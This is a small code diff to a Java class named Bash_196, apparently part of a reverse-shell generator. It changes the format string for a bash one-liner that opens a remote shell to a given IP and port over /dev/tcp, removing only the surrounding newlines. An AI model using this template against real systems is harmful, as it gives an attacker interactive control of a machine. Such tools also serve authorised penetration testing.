@@ -8,7 +8,7 @@ public class Bash_196 extends Reverse{
 
     public Bash_196(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("\n0<&196;exec 196<>/dev/tcp/%s/%s; %s <&196 >&196 2>&196\n", this.getLocalIP(), this.getLocalPort(), this.getShell());
+        shellFormat = String.format("0<&196;exec 196<>/dev/tcp/%s/%s; %s <&196 >&196 2>&196", this.getLocalIP(), this.getLocalPort(), this.getShell());
 
     }
 
